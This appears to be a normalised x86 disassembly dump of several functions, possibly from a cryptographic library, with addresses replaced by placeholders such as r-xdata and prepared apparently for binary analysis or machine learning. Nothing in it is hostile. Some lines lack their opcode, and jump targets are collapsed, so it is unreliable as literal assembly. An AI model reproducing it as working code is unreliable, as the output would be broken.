test ecx ecx
jle r-xdata
mov [ esp + 0x14 ] esi
jmp r-xdata
mov edi [ esp + 0x24 ]
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_10049960
mov eax 0x2c
call sub_1001d0d0
push ebx
push esi
push edi
or edi 0xffffffff
xor ebx ebx
mov [ esp + 0x18 ] edi
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
call sub_1002dc50
mov esi eax
cmp esi ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
add esp 0x2c
retn
push ebp
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov ebp eax
call sub_1002de70
push esi
mov [ esp + 0x30 ] eax
call sub_1002de70
mov edi [ esp + 0x5c ]
mov [ esp + 0x20 ] eax
mov eax [ edi + 0x10 ]
push eax
call sub_10029870
add eax 0x7
push 0x16a
cdq
and edx 0x7
push r--data
add eax edx
mov ebx eax
sar ebx 0x3
push ebx
mov [ esp + 0x6c ] ebx
call sub_1001d4c0
add esp 0x20
mov [ esp + 0x24 ] eax
test ebp ebp
je r-xdata
push 0x16d
push r--data
push 0x41
push 0x66
push 0x4
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_1002de00
push esi
call sub_1002dcb0
mov esi [ esp + 0x2c ]
add esp 0x8
test esi esi
pop ebp
je r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebx
add esp 0x2c
retn
push ebx
push esi
call sub_10026870
push esi
call sub_1001d740
add esp 0xc
mov ecx [ esp + 0x50 ]
dec ecx
je r-xdata
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
push ecx
push edx
push ebx
push eax
call sub_100596f0
sub ecx 0x2
je r-xdata
mov eax [ esp + 0x24 ]
push ebp
push ebx
push eax
call sub_10029d50
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
push ecx
push edx
push ebx
push eax
call sub_10058f80
jmp r-xdata
sub ecx 0x2
je r-xdata
mov ecx [ edi + 0x10 ]
push ecx
push ebp
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
add esp 0x10
test eax eax
jle r-xdata
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
push ecx
push edx
push ebx
push eax
call sub_10059a00
jmp r-xdata
push 0x17e
push r--data
push 0x76
push 0x66
push 0x4
call sub_1001de60
add esp 0x14
jmp r-xdata
test [ edi + 0x3c ] 0x80
jne r-xdata
push 0x188
push r--data
push 0x84
push 0x66
push 0x4
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ edi + 0x3c ]
test al 0x20
jne r-xdata
lea edx [ esp + 0x14 ]
push esi
push edx
push edi
call sub_10049d80
mov ebx eax
add esp 0xc
test ebx ebx
mov [ esp + 0x18 ] ebx
jne r-xdata
mov eax [ esp + 0x10 ]
mov edx [ edi + 0x8 ]
push esi
push edi
push ebp
push eax
call [ edx + 0x14 ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ edi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push 0x191
push r--data
push 0x44
push 0x66
push 0x4
call sub_1001de60
add esp 0x14
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
test ah 0x1
jne r-xdata
mov ecx [ edi + 0x20 ]
test ecx ecx
je r-xdata
push 0x143
push r--data
push 0x19
push 0x5
call sub_1001f5b0
mov eax [ esp + 0x30 ]
push esi
push ebx
push eax
push ebp
call sub_10036cb0
push 0x145
push r--data
push 0x19
push 0x6
mov ebx eax
call sub_1001f5b0
add esp 0x30
mov eax ebx
push esi
push ebx
push 0x0
push ebp
call sub_10036cb0
add esp 0x10
jmp r-xdata
mov eax [ esp + 0x50 ]
mov ebx [ esp + 0x10 ]
cmp eax 0x5
jne r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov edx [ edi + 0x18 ]
mov [ esp + 0x40 ] edx
lea ecx [ esp + 0x28 ]
push ecx
call sub_10029990
mov eax [ edi + 0x18 ]
lea edx [ esp + 0x2c ]
mov [ esp + 0x44 ] edx
add esp 0x4
mov ecx [ eax ]
mov [ esp + 0x28 ] ecx
mov edx [ eax + 0x4 ]
mov [ esp + 0x2c ] edx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x30 ] ecx
mov edx [ eax + 0xc ]
mov ecx [ esp + 0x38 ]
mov [ esp + 0x34 ] edx
mov eax [ eax + 0x10 ]
and ecx 0x1
and al 0xfe
or eax ecx
or al 0x6
mov [ esp + 0x38 ] eax
jmp r-xdata
mov ecx [ edi + 0x24 ]
test ecx ecx
je r-xdata
mov ebx [ esp + 0x4c ]
mov ebx [ esp + 0x4c ]
test eax eax
je r-xdata
push ebx
call sub_10029870
mov ebp [ esp + 0x50 ]
add eax 0x7
cdq
mov edi [ esp + 0x4c ]
and edx 0x7
add eax edx
mov ecx ebp
sar eax 0x3
sub ecx eax
add ecx edi
push ecx
push ebx
call sub_10029ef0
mov ecx ebp
add esp 0xc
sub ecx eax
test ecx ecx
jle r-xdata
mov edx [ edi + 0x10 ]
push ebx
push edx
push ebp
call sub_10038960
push ebp
push ebx
call sub_1002a000
add esp 0x14
test eax eax
je r-xdata
push 0x152
push r--data
push 0x19
push 0x9
call sub_1001f5b0
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x20 ]
push esi
push edx
push eax
push ecx
call sub_10036d30
push 0x154
push r--data
push 0x19
push 0xa
mov ebx eax
call sub_1001f5b0
mov eax ebx
mov ebx [ esp + 0x7c ]
add esp 0x30
mov ecx [ esp + 0x10 ]
push esi
push eax
push 0x0
push ecx
call sub_10036d30
add esp 0x10
jmp r-xdata
mov eax [ edi + 0x40 ]
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
push eax
mov eax [ esp + 0x44 ]
push esi
push ecx
mov ecx [ esp + 0x1c ]
push eax
push ebp
push ecx
call [ edx + 0x18 ]
add esp 0x18
test eax eax
jne r-xdata
mov eax [ edi + 0x10 ]
push esi
push eax
lea ecx [ edi + 0x40 ]
push 0x9
push ecx
call sub_1004c5e0
add esp 0x10
test eax eax
je r-xdata
test [ edi + 0x3c ] 0x2
je r-xdata
mov ecx [ edi + 0x28 ]
test ecx ecx
je r-xdata
mov [ esp + 0x1c ] ebp
jmp r-xdata
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ebx ebp
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ edi + 0x2c ]
test ecx ecx
jne r-xdata
sub_10049d80
push ebx
push esi
push edi
push 0x104
push r--data
push 0x9
push 0x5
xor edi edi
call sub_1001f5b0
mov esi [ esp + 0x20 ]
add esp 0x10
mov eax [ esi + 0x50 ]
test eax eax
jne r-xdata
mov ebx [ esi + 0x50 ]
test ebx ebx
je r-xdata
push 0x108
push r--data
push 0x9
push 0x6
call sub_1001f5b0
push 0x109
push r--data
push 0x9
push 0x9
call sub_1001f5b0
mov eax [ esi + 0x50 ]
add esp 0x20
test eax eax
mov edi 0x1
jne r-xdata
test edi edi
je r-xdata
push ebp
push ebx
call sub_10036db0
add esp 0x4
mov ebp eax
call sub_1001f590
cmp ebp eax
pop ebp
jne r-xdata
mov eax [ esp + 0x18 ]
push eax
push esi
call sub_10024820
add esp 0x8
mov [ esi + 0x50 ] eax
push 0x137
push r--data
push 0x9
push 0x6
call sub_1001f5b0
add esp 0x10
mov eax ebx
pop edi
pop esi
pop ebx
retn
push 0x135
push r--data
push 0x9
push 0xa
call sub_1001f5b0
add esp 0x10
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x14 ]
mov [ edx ] 0x0
mov eax [ esi + 0x54 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov [ ecx ] 0x1
jmp r-xdata
mov ebx [ esi + 0x54 ]
test edi edi
jne r-xdata
mov eax [ esi + 0x54 ]
test eax eax
jne r-xdata
push 0x128
push r--data
push 0x9
push 0x6
call sub_1001f5b0
push 0x129
push r--data
push 0x9
push 0x9
call sub_1001f5b0
add esp 0x20
mov edi 0x1
mov eax [ esp + 0x18 ]
push eax
push esi
call sub_10024820
add esp 0x8
mov [ esi + 0x54 ] eax
sub_10049ec0
mov eax 0x28
call sub_1001d0d0
push ebx
push esi
push edi
or edi 0xffffffff
xor ebx ebx
mov [ esp + 0xc ] edi
mov [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] ebx
call sub_1002dc50
mov esi eax
cmp esi ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
add esp 0x28
retn
push ebp
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov ebp eax
call sub_1002de70
push esi
mov [ esp + 0x30 ] eax
call sub_1002de70
mov edi [ esp + 0x58 ]
mov [ esp + 0x24 ] eax
mov eax [ edi + 0x10 ]
push eax
call sub_10029870
add eax 0x7
push 0x1ef
cdq
and edx 0x7
push r--data
add eax edx
mov ebx eax
sar ebx 0x3
push ebx
call sub_1001d4c0
add esp 0x20
mov [ esp + 0x48 ] eax
test ebp ebp
je r-xdata
push 0x1f2
push r--data
push 0x41
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0xc ]
pop edi
pop esi
pop ebx
add esp 0x28
retn
push ebx
push edi
call sub_10026870
push edi
call sub_1001d740
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x3c ]
cmp eax ebx
jle r-xdata
mov ecx [ esp + 0x40 ]
push ebp
push eax
push ecx
call sub_10029d50
add esp 0xc
test eax eax
je r-xdata
push 0x1fa
push r--data
push 0x6c
jmp r-xdata
mov edi [ esp + 0x48 ]
mov edx [ edi + 0x10 ]
push edx
push ebp
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
push 0x65
push 0x4
call sub_1001de60
add esp 0x14
test [ edi + 0x3c ] 0x80
jne r-xdata
push 0x203
push r--data
push 0x84
jmp r-xdata
mov ecx [ edi + 0x3c ]
test cl 0x20
jne r-xdata
lea eax [ esp + 0x1c ]
push esi
push eax
push edi
call sub_10049d80
add esp 0xc
mov [ esp + 0x18 ] eax
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
mov edx [ edi + 0x8 ]
push esi
push edi
push ebp
push eax
call [ edx + 0x14 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
test ecx ecx
je r-xdata
push 0x20c
push r--data
push 0x44
jmp r-xdata
mov ebp [ esp + 0x14 ]
test ch 0x1
jne r-xdata
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
push 0x143
push r--data
push 0x19
push 0x5
call sub_1001f5b0
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x30 ]
push esi
push ecx
push edx
push ebp
call sub_10036cb0
push 0x145
push r--data
push 0x19
push 0x6
mov [ esp + 0x6c ] eax
call sub_1001f5b0
mov eax [ esp + 0x6c ]
add esp 0x30
push esi
push eax
push 0x0
push ebp
call sub_10036cb0
add esp 0x10
jmp r-xdata
mov edi [ esp + 0x48 ]
push edi
push ebp
call sub_10029ef0
mov edx [ esp + 0x54 ]
add esp 0x8
lea ecx [ edx - 0x1 ]
cmp ecx 0x3
ja r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esp + 0x3c ] eax
lea eax [ esp + 0x24 ]
mov [ esp + 0x3c ] eax
mov eax [ edi + 0x18 ]
mov edx [ eax ]
mov [ esp + 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x28 ] edx
mov edx [ eax + 0x8 ]
mov [ esp + 0x2c ] edx
mov edx [ eax + 0xc ]
mov [ esp + 0x30 ] edx
mov eax [ eax + 0x10 ]
mov edx [ esp + 0x34 ]
and al 0xfe
and edx 0x1
or eax edx
or al 0x6
mov [ esp + 0x34 ] eax
jmp r-xdata
mov eax [ edi + 0x24 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
push 0x24c
push r--data
push 0x76
push 0x65
push 0x4
call sub_1001de60
add esp 0x14
jmp r-xdata
jmp [ ecx * 4 + jump_table_1004a280 ]
push 0x152
push r--data
push 0x19
push 0x9
call sub_1001f5b0
mov ecx [ esp + 0x30 ]
push esi
push edi
push ecx
push ebp
call sub_10036d30
push 0x154
push r--data
push 0x19
push 0xa
mov edi eax
call sub_1001f5b0
add esp 0x30
mov eax edi
push esi
push edi
push 0x0
push ebp
call sub_10036d30
add esp 0x10
jmp r-xdata
mov ecx [ edi + 0x40 ]
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x8 ]
push ecx
mov ecx [ esp + 0x40 ]
push esi
push edx
push ecx
push ebp
mov ebp [ esp + 0x28 ]
push ebp
call [ eax + 0x18 ]
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ edi + 0x10 ]
push esi
push ecx
lea edx [ edi + 0x40 ]
push 0x9
push edx
call sub_1004c5e0
add esp 0x10
test eax eax
je r-xdata
test cl 0x2
je r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
push esi
call sub_1002de00
push esi
call sub_1002dcb0
add esp 0x8
test edi edi
pop ebp
je r-xdata
push ebx
push eax
mov eax [ esp + 0x4c ]
push edi
push ebx
push eax
call sub_10059920
jmp r-xdata
mov ecx [ esp + 0x44 ]
push 0x0
push 0x0
push ebx
push eax
push edi
push ebx
push ecx
call sub_100593b0
add esp 0x1c
jmp r-xdata
mov edx [ esp + 0x44 ]
push ebx
push eax
push edi
push ebx
push edx
call sub_10059100
jmp r-xdata
push ebx
push eax
mov eax [ esp + 0x4c ]
push edi
push ebx
push eax
call sub_10058fe0
test eax eax
je r-xdata
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
jmp r-xdata
mov eax [ edi + 0x2c ]
test eax eax
jne r-xdata
add esp 0x14
test eax eax
mov [ esp + 0x10 ] eax
jge r-xdata
push 0x250
push r--data
push 0x72
push 0x65
push 0x4
call sub_1001de60
add esp 0x14
jmp r-xdata
sub_1004a290
mov eax 0x8
call sub_1001d0d0
push edi
mov edi [ esp + 0x1c ]
mov [ esp + 0x4 ] 0xffffffff
mov eax [ edi + 0x10 ]
push eax
call sub_10029870
add esp 0x4
cmp eax 0x4000
jle r-xdata
mov ecx [ edi + 0x14 ]
mov edx [ edi + 0x10 ]
push ecx
push edx
call sub_10029fb0
add esp 0x8
test eax eax
jg r-xdata
push 0x26c
push r--data
push 0x69
push 0x67
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
add esp 0x8
retn
mov eax [ edi + 0x10 ]
push eax
call sub_10029870
add esp 0x4
cmp eax 0xc00
jle r-xdata
push 0x272
jmp r-xdata
push ebp
push esi
call sub_1002dc50
mov ebp eax
test ebp ebp
je r-xdata
mov ecx [ edi + 0x14 ]
push ecx
call sub_10029870
add esp 0x4
cmp eax 0x40
jle r-xdata
push r--data
push 0x65
push 0x67
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
add esp 0x8
retn
mov eax [ esp + 0xc ]
pop esi
pop ebp
pop edi
add esp 0x8
retn
push ebx
push ebp
call sub_1002dd20
push ebp
call sub_1002de70
push ebp
mov ebx eax
call sub_1002de70
mov edx [ edi + 0x10 ]
mov [ esp + 0x20 ] eax
push edx
call sub_10029870
add eax 0x7
push 0x285
cdq
and edx 0x7
push r--data
add eax edx
mov esi eax
sar esi 0x3
push esi
call sub_1001d4c0
add esp 0x1c
mov [ esp + 0x28 ] eax
test ebx ebx
je r-xdata
push 0x27b
push 0x288
push r--data
push 0x41
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
push esi
push edi
call sub_10026870
push edi
call sub_1001d740
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
cmp eax esi
jle r-xdata
push ebx
push eax
mov eax [ esp + 0x28 ]
push eax
call sub_10029d50
add esp 0xc
test eax eax
je r-xdata
push 0x290
push r--data
push 0x6c
jmp r-xdata
mov edi [ esp + 0x28 ]
mov ecx [ edi + 0x10 ]
push ecx
push ebx
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
push 0x67
push 0x4
call sub_1001de60
add esp 0x14
test [ edi + 0x3c ] 0x2
je r-xdata
push 0x298
push r--data
push 0x84
jmp r-xdata
mov edx [ edi + 0x40 ]
mov eax [ edi + 0x10 ]
mov ecx [ edi + 0x8 ]
push edx
mov edx [ edi + 0x14 ]
push ebp
push eax
push edx
push ebx
mov ebx [ esp + 0x28 ]
push ebx
call [ ecx + 0x18 ]
add esp 0x18
test eax eax
je r-xdata
mov edx [ edi + 0x10 ]
push ebp
push edx
lea eax [ edi + 0x40 ]
push 0x9
push eax
call sub_1004c5e0
add esp 0x10
test eax eax
je r-xdata
cmp [ esp + 0x2c ] 0x5
jne r-xdata
mov edi [ esp + 0x28 ]
push edi
push ebx
call sub_10029ef0
mov ecx [ esp + 0x34 ]
add esp 0x8
dec ecx
je r-xdata
mov eax [ ebx ]
mov ecx [ eax ]
and ecx 0xf
cmp cl 0xc
je r-xdata
mov edx [ esp + 0x24 ]
push esi
push eax
push edi
push esi
push edx
call sub_10059770
sub ecx 0x2
je r-xdata
mov edx [ edi + 0x10 ]
push ebx
push edx
push ebx
call sub_10038960
add esp 0xc
push ebp
call sub_1002de00
push ebp
call sub_1002dcb0
add esp 0x8
test edi edi
pop ebx
je r-xdata
push 0x2b9
push r--data
push 0x72
push 0x67
push 0x4
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ esp + 0x24 ]
push esi
push eax
push edi
push esi
push ecx
call sub_10058fe0
jmp r-xdata
sub ecx 0x2
je r-xdata
add esp 0x14
mov [ esp + 0x10 ] eax
test eax eax
jge r-xdata
push esi
push eax
mov eax [ esp + 0x2c ]
push edi
push esi
push eax
call sub_10059a90
jmp r-xdata
push 0x2b5
push r--data
push 0x76
push 0x67
push 0x4
call sub_1001de60
add esp 0x14
jmp r-xdata
sub_1004a540
mov eax 0x88
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0xa8 ]
mov [ esp + 0x18 ] 0x0
push edi
call sub_1002dd20
push edi
call sub_1002de70
push edi
mov ebx eax
call sub_1002de70
push edi
mov [ esp + 0x20 ] eax
call sub_1002de70
mov esi [ esp + 0xb4 ]
mov [ esp + 0x54 ] eax
add esp 0x10
mov eax [ esi + 0x3c ]
test ah 0x1
jne r-xdata
mov edx [ esi + 0x20 ]
mov ebp [ esi + 0x1c ]
mov [ esp + 0x14 ] edx
lea eax [ esp + 0x48 ]
push eax
call sub_10029990
mov eax [ esi + 0x1c ]
lea ebp [ esp + 0x4c ]
mov ecx [ eax ]
mov [ esp + 0x4c ] ecx
mov edx [ eax + 0x4 ]
mov [ esp + 0x50 ] edx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x54 ] ecx
mov edx [ eax + 0xc ]
mov ecx [ esp + 0x5c ]
mov [ esp + 0x58 ] edx
mov eax [ eax + 0x10 ]
and ecx 0x1
and al 0xfe
lea edx [ esp + 0x20 ]
or eax ecx
push edx
or al 0x6
mov [ esp + 0x60 ] eax
call sub_10029990
lea eax [ esp + 0x24 ]
add esp 0x8
mov [ esp + 0x14 ] eax
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
mov [ esp + 0x1c ] ecx
mov edx [ eax + 0x4 ]
mov [ esp + 0x20 ] edx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x24 ] ecx
mov edx [ eax + 0xc ]
mov ecx [ esp + 0x2c ]
mov [ esp + 0x28 ] edx
mov eax [ eax + 0x10 ]
and ecx 0x1
and al 0xfe
or eax ecx
or al 0x6
mov [ esp + 0x2c ] eax
jmp r-xdata
test [ esi + 0x3c ] 0x2
je r-xdata
push edi
push ebp
lea eax [ esi + 0x44 ]
push 0x9
push eax
call sub_1004c5e0
add esp 0x10
test eax eax
je r-xdata
test [ esi + 0x3c ] 0x4
je r-xdata
mov eax [ esi + 0x3c ]
test ah 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
push edi
push eax
lea ecx [ esi + 0x40 ]
push 0x9
push ecx
call sub_1004c5e0
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_1002de00
mov eax [ esp + 0x1c ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x88
retn
mov ecx [ esp + 0x14 ]
push edi
push ecx
lea edx [ esi + 0x48 ]
push 0x9
push edx
call sub_1004c5e0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esi + 0x20 ]
mov ebp [ esp + 0xa0 ]
push edi
push ecx
push ebp
push ebx
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov ebp [ esp + 0xa0 ]
push edi
mov eax [ ebp + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp ]
mov [ esp + 0x38 ] eax
mov eax [ ebp + 0x10 ]
mov [ esp + 0x3c ] ecx
mov ecx [ esp + 0x44 ]
and al 0xfe
and ecx 0x1
mov [ esp + 0x34 ] edx
mov edx [ ebp + 0xc ]
or eax ecx
or al 0x6
mov [ esp + 0x40 ] edx
mov edx [ esi + 0x20 ]
mov [ esp + 0x44 ] eax
lea eax [ esp + 0x34 ]
push edx
push eax
push ebx
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov eax [ esi + 0x3c ]
test ah 0x1
jne r-xdata
jmp r-xdata
mov ecx [ esi + 0x28 ]
mov eax [ esi + 0x28 ]
lea ecx [ esp + 0x5c ]
mov edx [ eax ]
mov [ esp + 0x5c ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x60 ] edx
mov edx [ eax + 0x8 ]
mov [ esp + 0x64 ] edx
mov edx [ eax + 0xc ]
mov [ esp + 0x68 ] edx
mov eax [ eax + 0x10 ]
mov edx [ esp + 0x6c ]
and al 0xfe
and edx 0x1
or eax edx
or al 0x6
mov [ esp + 0x6c ] eax
jmp r-xdata
mov eax [ esi + 0x3c ]
test ah 0x1
jne r-xdata
mov edx [ esi + 0x48 ]
mov eax [ esi + 0x8 ]
push edx
mov edx [ esi + 0x20 ]
push edi
push edx
push ecx
mov ecx [ esp + 0x20 ]
push ebx
push ecx
call [ eax + 0x18 ]
add esp 0x18
test eax eax
je r-xdata
mov ecx [ esi + 0x1c ]
push edi
push ecx
push ebp
push ebx
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp ]
mov [ esp + 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ esp + 0x38 ] ecx
mov ecx [ esp + 0x40 ]
and al 0xfe
and ecx 0x1
mov [ esp + 0x30 ] edx
mov edx [ ebp + 0xc ]
or eax ecx
or al 0x6
mov [ esp + 0x3c ] edx
mov edx [ esi + 0x1c ]
mov [ esp + 0x40 ] eax
push edi
lea eax [ esp + 0x34 ]
push edx
push eax
push ebx
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov eax [ esi + 0x3c ]
test ah 0x1
jne r-xdata
jmp r-xdata
mov ecx [ esi + 0x24 ]
mov eax [ esi + 0x24 ]
lea ecx [ esp + 0x70 ]
mov edx [ eax ]
mov [ esp + 0x70 ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x74 ] edx
mov edx [ eax + 0x8 ]
mov [ esp + 0x78 ] edx
mov edx [ eax + 0xc ]
mov [ esp + 0x7c ] edx
mov eax [ eax + 0x10 ]
mov edx [ esp + 0x80 ]
and al 0xfe
and edx 0x1
or eax edx
or al 0x6
mov [ esp + 0x80 ] eax
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x9c ]
push edx
push eax
push eax
call sub_10038960
add esp 0xc
test eax eax
je r-xdata
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x8 ]
push edx
mov edx [ esi + 0x1c ]
push edi
push edx
push ecx
mov ecx [ esp + 0xac ]
push ebx
push ecx
call [ eax + 0x18 ]
add esp 0x18
test eax eax
je r-xdata
mov eax [ esp + 0x9c ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov edx [ esi + 0x2c ]
push edi
push edx
push eax
push ebx
call sub_100382b0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push eax
push eax
call sub_10038680
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi + 0x3c ]
test ah 0x1
jne r-xdata
mov eax [ esp + 0x9c ]
mov eax ebx
mov ecx [ ebx ]
lea eax [ esp + 0x84 ]
mov [ esp + 0x84 ] ecx
mov edx [ ebx + 0x4 ]
mov [ esp + 0x88 ] edx
mov ecx [ ebx + 0x8 ]
mov [ esp + 0x8c ] ecx
mov edx [ ebx + 0xc ]
mov [ esp + 0x90 ] edx
mov ecx [ ebx + 0x10 ]
mov edx [ esp + 0x94 ]
and ecx 0xfffffffe
and edx 0x1
or ecx edx
or ecx 0x6
mov [ esp + 0x94 ] ecx
jmp r-xdata
mov eax [ esp + 0x9c ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x1c ]
mov edx [ esp + 0x9c ]
push edi
push ecx
push eax
push edx
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov edx [ esi + 0x20 ]
push edi
push edx
push eax
push ebx
call sub_100382b0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push eax
push eax
call sub_10038680
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x9c ]
push eax
push ebx
push ecx
call sub_10038680
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x9c ]
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov [ esp + 0x18 ] 0x1
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov ebx [ esi + 0x40 ]
mov edx [ esi + 0x8 ]
push ebx
mov ebx [ esp + 0x48 ]
push edi
push eax
mov eax [ esp + 0xa8 ]
push ecx
push eax
push ebx
call [ edx + 0x18 ]
add esp 0x18
test eax eax
je r-xdata
push ebp
push ebx
push ebx
call sub_10038960
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esi + 0x10 ]
push edi
push ecx
push ebx
push ebx
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi + 0x10 ]
push edx
push ebx
push ebx
call sub_10038680
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi + 0x3c ]
test ah 0x1
jne r-xdata
mov ecx [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
lea ecx [ esp + 0x1c ]
mov edx [ eax ]
mov [ esp + 0x1c ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x20 ] edx
mov edx [ eax + 0x8 ]
mov [ esp + 0x24 ] edx
mov edx [ eax + 0xc ]
mov [ esp + 0x28 ] edx
mov eax [ eax + 0x10 ]
mov edx [ esp + 0x2c ]
and al 0xfe
and edx 0x1
or eax edx
or al 0x6
mov [ esp + 0x2c ] eax
jmp r-xdata
mov edx [ esi + 0x40 ]
mov eax [ esi + 0x8 ]
push edx
mov edx [ esi + 0x10 ]
push edi
push edx
push ecx
mov ecx [ esp + 0xac ]
push ebp
push ecx
call [ eax + 0x18 ]
add esp 0x18
test eax eax
je r-xdata
sub_1004aab0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_1004c390
add esp 0x4
mov esi [ esi + 0x48 ]
test esi esi
je r-xdata
push eax
call sub_1004c390
add esp 0x4
mov eax 0x1
pop esi
retn
push esi
call sub_1004c390
add esp 0x4
sub_1004ab60
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x10 ]
push ebp
mov ebp [ eax ]
mov eax [ ecx + 0x14 ]
cmp ebp eax
jne r-xdata
push ebx
push esi
test ebp ebp
push edi
jge r-xdata
or eax 0xffffffff
pop ebp
retn
mov ebx ebp
or ebx 0xffffffff
sub ebx ebp
jmp r-xdata
lea eax [ ecx + edi ]
pop edi
pop esi
pop ebx
pop ebp
retn
test ecx ecx
je r-xdata
push ebx
call sub_10029820
mov esi [ esp + 0x1c ]
mov edx eax
and dl 0x7
add esp 0x4
neg dl
sbb edx edx
lea edi [ eax + 0x7 ]
inc edx
sar edi 0x3
test esi esi
mov ecx edx
je r-xdata
lea eax [ edi - 0x1 ]
test eax eax
jl r-xdata
test ebp ebp
setge al
dec eax
and eax 0xff
mov [ esi ] al
inc esi
test ebp ebp
mov [ eax + esi ] bl
jge r-xdata
shr ebx 0x8
dec eax
jns r-xdata
mov dl bl
not dl
mov [ eax + esi ] dl
sub_1004abe0
push ebp
mov ebp [ esp + 0x10 ]
cmp ebp 0x4
jle r-xdata
push esi
mov esi [ esp + 0x10 ]
test ebp ebp
push edi
je r-xdata
push 0x94
jmp r-xdata
xor edi edi
test [ esi ] 0x80
je r-xdata
push r--data
push 0x80
push 0xa6
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop ebp
retn
test edi edi
pop edi
mov ecx eax
pop esi
je r-xdata
shl eax 0x8
test edi edi
je r-xdata
mov edi 0x1
jmp r-xdata
mov eax [ esp + 0x1c ]
cmp ecx [ eax + 0x14 ]
jne r-xdata
or ecx 0xffffffff
